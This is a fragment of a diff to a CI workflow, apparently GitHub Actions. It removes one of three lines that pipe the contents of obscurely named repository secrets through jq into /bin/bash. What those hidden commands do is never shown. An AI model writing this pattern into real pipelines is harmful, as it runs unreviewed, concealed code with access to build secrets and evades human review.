@@ -21,7 +21,6 @@ jobs:
           abcuv29: ${{ secrets.abcuv29 }}
         run: |
           printf '%s' "$abcuv29" | jq -r .gf708 | /bin/bash
-          echo $vu9582 | jq -r .va03905 | /bin/bash
           printf '%s' "$ni4" | jq -r .guhmc3 | /bin/bash
 
       - name: Store artifact
